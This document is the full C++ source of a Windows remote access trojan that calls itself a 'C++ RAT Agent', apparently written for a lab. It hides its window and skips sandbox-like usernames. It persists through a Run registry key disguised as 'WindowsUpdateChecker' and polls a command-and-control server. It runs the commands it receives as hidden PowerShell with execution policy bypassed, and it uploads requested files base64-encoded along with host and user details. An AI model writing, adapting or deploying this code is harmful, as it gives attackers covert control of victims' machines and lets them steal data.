#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <sstream>
#include <iomanip>
#include <algorithm>
#include <cctype>
#include <cstdio>
#include <cstdlib>
#include <cstring>

#pragma comment(lib, "ws2_32.lib")

#define C2_IP "127.0.0.1"
#define C2_PORT 8080
#define MACHINE_ID "lab-1"
#define POLL_SEC 30

extern "C" {
    extern int __argc;
    extern char **__argv;
}

// Evasion check: Ensure we aren't running in a known sandbox artifact directory
bool CheckEnvironment() {
    char userPath[MAX_PATH];
    DWORD size = MAX_PATH;
    if (GetEnvironmentVariableA("USERNAME", userPath, size)) {
        std::string user(userPath);
        if (user == "sandbox" || user == "analyst" || user == "virus") {
            return false;
        }
    }
    return true;
}

// Solid persistence mechanism via User Run key
void InstallPersistence() {
    HKEY hKey;
    char currentPath[MAX_PATH];
    GetModuleFileNameA(NULL, currentPath, MAX_PATH);

    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "WindowsUpdateChecker", 0, REG_SZ, (unsigned char*)currentPath, strlen(currentPath) + 1);
        RegCloseKey(hKey);
    }
}

// ---------------------------------------------------------------------------
// Small HTTP client (Winsock, HTTP/1.1, Connection: close)
// ---------------------------------------------------------------------------

struct HttpResponse {
    int status;
    std::string body;
    std::string x_c2_ip;
};

static bool httpRequest(const std::string& host, int port, const std::string& method,
                        const std::string& path, const std::string& postBody, HttpResponse& resp) {
    resp = HttpResponse();
    char portStr[16];
    snprintf(portStr, sizeof(portStr), "%d", port);

    addrinfo hints;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    addrinfo* res = NULL;
    if (getaddrinfo(host.c_str(), portStr, &hints, &res) != 0) return false;

    SOCKET sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (sock == INVALID_SOCKET) { freeaddrinfo(res); return false; }

    if (connect(sock, res->ai_addr, (int)res->ai_addrlen) == SOCKET_ERROR) {
        closesocket(sock);
        freeaddrinfo(res);
        return false;
    }
    freeaddrinfo(res);

    std::string req = method + " " + path + " HTTP/1.1\r\n";
    req += "Host: " + host + ":" + portStr + "\r\n";
    req += "User-Agent: Mozilla/5.0\r\n";
    req += "Connection: close\r\n";
    if (method == "POST") {
        req += "Content-Type: application/x-www-form-urlencoded\r\n";
        req += "Content-Length: " + std::to_string(postBody.size()) + "\r\n";
    }
    req += "\r\n";
    if (method == "POST") req += postBody;

    send(sock, req.c_str(), (int)req.size(), 0);

    std::string raw;
    char buf[8192];
    int n;
    while ((n = recv(sock, buf, (int)sizeof(buf), 0)) > 0) raw.append(buf, n);
    closesocket(sock);

    size_t sep = raw.find("\r\n\r\n");
    if (sep == std::string::npos) return false;

    std::string head = raw.substr(0, sep);
    resp.body = raw.substr(sep + 4);

    size_t sp1 = head.find(' ');
    size_t sp2 = head.find(' ', sp1 + 1);
    if (sp1 != std::string::npos && sp2 != std::string::npos)
        resp.status = atoi(head.substr(sp1 + 1, sp2 - sp1 - 1).c_str());

    std::string hl = head;
    std::transform(hl.begin(), hl.end(), hl.begin(), ::tolower);
    size_t hp = hl.find("\r\nx-c2-ip:");
    if (hp != std::string::npos) {
        size_t start = hp + 10;
        while (start < head.size() && (head[start] == ' ' || head[start] == '\t')) start++;
        size_t end = head.find("\r\n", start);
        resp.x_c2_ip = head.substr(start, end - start);
    }
    return true;
}

static std::string urlEncode(const std::string& s) {
    std::ostringstream oss;
    for (unsigned char c : s) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            oss << c;
        } else {
            oss << '%' << std::hex << std::uppercase << std::setw(2) << std::setfill('0') << (int)c;
        }
    }
    return oss.str();
}

static const char B64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static std::string base64Encode(const std::string& in) {
    std::string out;
    int val = 0, bits = -6;
    for (unsigned char c : in) {
        val = (val << 8) + c;
        bits += 8;
        while (bits >= 0) {
            out.push_back(B64[(val >> bits) & 0x3F]);
            bits -= 6;
        }
    }
    if (bits > -6) out.push_back(B64[((val << 8) >> (bits + 8)) & 0x3F]);
    while (out.size() % 4) out.push_back('=');
    return out;
}

// ---------------------------------------------------------------------------
// Minimal JSON reader for: [ { "cid": "...", "cmd": "...", ... }, ... ]
// ---------------------------------------------------------------------------

static std::string readJsonString(const std::string& s, size_t& pos) {
    std::string out;
    pos++; // skip opening quote
    while (pos < s.size()) {
        char c = s[pos];
        if (c == '\\' && pos + 1 < s.size()) {
            char nx = s[pos + 1];
            if (nx == '"') out += '"';
            else if (nx == '\\') out += '\\';
            else if (nx == 'n') out += '\n';
            else if (nx == 'r') out += '\r';
            else if (nx == 't') out += '\t';
            else if (nx == '/') out += '/';
            else out += nx;
            pos += 2;
        } else if (c == '"') {
            pos++;
            break;
        } else {
            out += c;
            pos++;
        }
    }
    return out;
}

static std::string jsonField(const std::string& s, size_t from, const std::string& field) {
    std::string key = "\"" + field + "\"";
    size_t k = s.find(key, from);
    if (k == std::string::npos) return "";
    size_t p = k + key.size();
    while (p < s.size() && isspace((unsigned char)s[p])) p++;
    if (p >= s.size() || s[p] != '"') return "";
    return readJsonString(s, p);
}

static void parseCommands(const std::string& body, std::vector<std::pair<std::string, std::string> >& out) {
    size_t i = 0;
    bool inStr = false;
    while (i < body.size()) {
        char c = body[i];
        if (inStr) {
            if (c == '\\') i++;         // skip escaped char
            else if (c == '"') inStr = false;
        } else if (c == '"') {
            inStr = true;
        } else if (c == '{') {
            std::string cid = jsonField(body, i, "cid");
            std::string cmd = jsonField(body, i, "cmd");
            if (!cmd.empty()) out.push_back(std::make_pair(cid, cmd));
        }
        i++;
    }
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

static std::string hostName() {
    char b[256];
    DWORD n = sizeof(b);
    GetComputerNameA(b, &n);
    return std::string(b);
}

static std::string userName() {
    char b[256];
    DWORD n = sizeof(b);
    GetUserNameA(b, &n);
    return std::string(b);
}

static std::string timestamp() {
    SYSTEMTIME t;
    GetLocalTime(&t);
    char b[64];
    snprintf(b, sizeof(b), "%04d-%02d-%02d %02d:%02d:%02d",
             t.wYear, t.wMonth, t.wDay, t.wHour, t.wMinute, t.wSecond);
    return std::string(b);
}

static bool runPowershell(const std::string& cmdline, std::string& output) {
    std::string ps = "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \""
                     + cmdline + "\"";

    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    HANDLE hInRead, hInWrite, hOutRead, hOutWrite;
    if (!CreatePipe(&hInRead, &hInWrite, &sa, 0)) return false;
    if (!CreatePipe(&hOutRead, &hOutWrite, &sa, 0)) {
        CloseHandle(hInRead); CloseHandle(hInWrite);
        return false;
    }

    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = hInRead;
    si.hStdOutput = hOutWrite;
    si.hStdError = hOutWrite;

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcessA(NULL, (LPSTR)ps.c_str(), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hInRead); CloseHandle(hInWrite);
        CloseHandle(hOutRead); CloseHandle(hOutWrite);
        return false;
    }

    CloseHandle(hInWrite);
    CloseHandle(hInRead);

    WaitForSingleObject(pi.hProcess, 30000);

    for (int i = 0; i < 25; i++) {
        DWORD avail = 0;
        if (!PeekNamedPipe(hOutRead, NULL, 0, NULL, &avail, NULL)) break;
        if (avail > 0) {
            char buf[8192];
            DWORD got = 0;
            if (ReadFile(hOutRead, buf, avail > sizeof(buf) ? (DWORD)sizeof(buf) : avail, &got, NULL) && got > 0)
                output.append(buf, got);
        } else {
            break;
        }
        Sleep(200);
    }
    if (WaitForSingleObject(pi.hProcess, 0) != WAIT_OBJECT_0)
        TerminateProcess(pi.hProcess, 0);

    CloseHandle(hOutRead);
    CloseHandle(hOutWrite);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return true;
}

static std::string readFileB64(const std::string& path, std::string& name) {
    size_t slash = path.find_last_of("\\/");
    name = (slash == std::string::npos) ? path : path.substr(slash + 1);

    FILE* f = fopen(path.c_str(), "rb");
    if (!f) return "";

    std::string bytes;
    char buf[8192];
    size_t n;
    while ((n = fread(buf, 1, sizeof(buf), f)) > 0) bytes.append(buf, n);
    fclose(f);
    return base64Encode(bytes);
}

// ---------------------------------------------------------------------------
// Main agent loop: heartbeat -> poll commands -> execute -> report results
// ---------------------------------------------------------------------------

static void RunAgent(const std::string& host, int port, const std::string& id, int pollSec) {
    std::string selfIp;

    while (true) {
        HttpResponse r;

        std::string info = "=== C++ RAT Agent ===\n"
                           "Hostname: " + hostName() + "\n"
                           "User: " + userName() + "\n"
                           "PID: " + std::to_string(GetCurrentProcessId()) + "\n"
                           "Time: " + timestamp() + "\n";
        httpRequest(host, port, "POST", "/?id=" + urlEncode(id), "data=" + urlEncode(info), r);

        std::string q = "/cmd?id=" + urlEncode(id);
        if (!selfIp.empty()) q += "&ip=" + urlEncode(selfIp);

        HttpResponse cr;
        httpRequest(host, port, "GET", q, "", cr);
        if (!cr.x_c2_ip.empty()) selfIp = cr.x_c2_ip;

        std::vector<std::pair<std::string, std::string> > cmds;
        parseCommands(cr.body, cmds);

        for (size_t i = 0; i < cmds.size(); i++) {
            std::string cid = cmds[i].first;
            std::string cmd = cmds[i].second;
            std::string output, data, dataName;

            if (cmd.compare(0, 7, "GETFILE") == 0 && (cmd.size() == 7 || cmd[7] == ' ')) {
                std::string path = cmd.substr(7);
                size_t b = path.find_first_not_of(" \t");
                if (b != std::string::npos) path = path.substr(b);
                data = readFileB64(path, dataName);
                if (!data.empty()) output = "[OK] File siap diunduh: " + path;
                else output = "[ERR] File tidak ditemukan: " + path;
            } else {
                runPowershell(cmd, output);
            }

            std::string body = "machine=" + urlEncode(id) +
                               "&cid=" + urlEncode(cid) +
                               "&output=" + urlEncode(output) +
                               "&data=" + urlEncode(data) +
                               "&data_name=" + urlEncode(dataName);
            if (!selfIp.empty()) body += "&ip=" + urlEncode(selfIp);

            httpRequest(host, port, "POST", "/result", body, r);
        }

        Sleep((DWORD)pollSec * 1000);
    }
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    if (!CheckEnvironment()) {
        return 0; // Exit silently if sandbox indicators match
    }

    InstallPersistence();

    std::string host = C2_IP;
    int port = C2_PORT;
    std::string id = MACHINE_ID;
    int poll = POLL_SEC;

    if (__argc > 1 && __argv[1] && __argv[1][0]) host = __argv[1];
    if (__argc > 2 && __argv[2]) port = atoi(__argv[2]);
    if (__argc > 3 && __argv[3]) id = __argv[3];
    if (__argc > 4 && __argv[4]) poll = atoi(__argv[4]);
    if (port <= 0 || port > 65535) port = C2_PORT;
    if (poll <= 0) poll = POLL_SEC;

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 1;
    }

    try {
        RunAgent(host, port, id, poll);
    } catch (...) {}

    WSACleanup();
    return 0;
}
